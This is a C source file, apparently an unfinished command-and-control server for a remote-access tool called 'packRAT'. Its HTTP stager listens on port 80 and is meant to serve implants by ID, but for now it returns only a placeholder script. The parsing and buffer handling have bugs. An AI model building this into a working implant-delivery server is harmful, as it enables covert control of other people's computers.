#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>



/*
                              $$\       $$$$$$$\   $$$$$$\ $$$$$$$$\ 
                              $$ |      $$  __$$\ $$  __$$\\__$$  __|
 $$$$$$\   $$$$$$\   $$$$$$$\ $$ |  $$\ $$ |  $$ |$$ /  $$ |  $$ |   
$$  __$$\  \____$$\ $$  _____|$$ | $$  |$$$$$$$  |$$$$$$$$ |  $$ |   
$$ /  $$ | $$$$$$$ |$$ /      $$$$$$  / $$  __$$< $$  __$$ |  $$ |   
$$ |  $$ |$$  __$$ |$$ |      $$  _$$<  $$ |  $$ |$$ |  $$ |  $$ |   
$$$$$$$  |\$$$$$$$ |\$$$$$$$\ $$ | \$$\ $$ |  $$ |$$ |  $$ |  $$ |   
$$  ____/  \_______| \_______|\__|  \__|\__|  \__|\__|  \__|  \__|   
$$ |                                                                 
$$ |                                                                 
\__|                                                                 

*/

//Regular text
#define BLK "\e[0;30m"
#define RED "\e[0;31m"
#define GRN "\e[0;32m"
#define YEL "\e[0;33m"
#define BLU "\e[0;34m"
#define MAG "\e[0;35m"
#define CYN "\e[0;36m"
#define WHT "\e[0;37m"

//Regular bold text
#define BBLK "\e[1;30m"
#define BRED "\e[1;31m"
#define BGRN "\e[1;32m"
#define BYEL "\e[1;33m"
#define BBLU "\e[1;34m"
#define BMAG "\e[1;35m"
#define BCYN "\e[1;36m"
#define BWHT "\e[1;37m"

//Reset
#define CRESET "\e[0m"

int* running;

typedef struct command {
    char *str;
    struct Command* next;
} Command;

typedef struct listener {
    unsigned int id;
    char buf[65536];
    Command* pending;
} Listener;


// Set up TCP listener on port 80 bound to any interface
int stage_sock;
struct sockaddr_in stage_addr, stage_req_addr;
socklen_t stage_req_addr_len = sizeof(stage_req_addr);
char stage_req[1024];


int stager_req_id(char* req) {
    if (strlen(req) < 6 || strncmp(req, "GET /", 6) != 0) {
        return -1;
    }
    return atoi(req + 6);
}

char* stager_req_ip(char* req) {
    char* r = malloc(strlen(req) + 1);
    strcpy(r, req);
    r = strtok(r, " ");
    r = strtok(NULL, " ");
    r = strtok(NULL, " ");
    r = strtok(NULL, " ");
    r = strtok(r, "\n");
    return r;
}

char* gen_stager_resp(int id, char* host) {
    char* resp = malloc(1024);
    strcpy(resp, "HTTP/1.1 200 OK\n\r#!/bin/sh\necho lulz\n");
    return resp;
}

int init_stager() {
    // Create TCP socket
    stage_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(stage_sock < 0){
        printf("Problem while creating staging socket\n");
        return -1;
    }

    int port = 80;
    int bind_succes = 0;

    // Set port and IP:
    stage_addr.sin_family = AF_INET;
    stage_addr.sin_port = htons(port);
    stage_addr.sin_addr.s_addr = INADDR_ANY;

    // Bind to the set port and IP:
    while(bind(stage_sock, (const struct sockaddr*)&stage_addr, stage_req_addr_len) < 0){
        printf(RED "  [ERROR]:   Couldn't bind to port %d, trying port %d\n" CRESET, port, port + 1);
        port++;
        if (port == 90) {
            port = 8080;
        }
        if (port == 8090) {
            printf("Port bind failed\n");
            return -1;
        }
        stage_addr.sin_port = htons(port);
    }
    printf(GRN "  [SUCCESS]: Bound to port %d\n" CRESET, port);
    fflush(stdout);
    return 0;
}

void *stager_loop(void *vargp) {
    while (*running) {
        // Listen for incoming connections:
        if(listen(stage_sock, 1) < 0){
            perror("Problem while listening");
            continue;
        }
        // Accept incoming connection:
        int conn = accept(stage_sock, (struct sockaddr*)&stage_req_addr, &stage_req_addr_len);
        if(conn < 0){
            perror("Problem while accepting connection");
            continue;
        }
        // Receive HTTP request:
        int recv_len = recvfrom(conn, stage_req, 1024, 0, (struct sockaddr*)&stage_req_addr, &stage_req_addr_len);
        if(recv_len < 0){
            perror("Problem while receiving message");
            continue;
        }
        stage_req[recv_len] = 0;
        // Parse HTTP request
        int id = stager_req_id(stage_req);
        if (id < 0) {
            // Invalid request
            continue;
        }
        char* host = stager_req_ip(stage_req);
        // Respond with an implant matching the requested ID with the correct host
        char* resp = gen_stager_resp(id, host);

        // Send response:
        stage_req_addr_len = sizeof(stage_req_addr);
        if(sendto(conn, resp, strlen(resp), 0, (struct sockaddr*)&stage_req_addr, stage_req_addr_len) < 0){
            perror("Problem while sending message");
            continue;
        }
        // Close connection:
        close(conn);
        printf(BLU "  [INFO]: Stager requested using ID %d from host %s\n" CRESET, id, host);
    }
    return NULL;
}




int main() {


    // Initialize running semaphore
    running = malloc(sizeof(int));
    *running = 1;

    // Initialize stager
    init_stager();

    pthread_t stager_thread;
    pthread_create(&stager_thread, NULL, stager_loop, NULL);

    while (*running) {
        sleep(1);
    }
}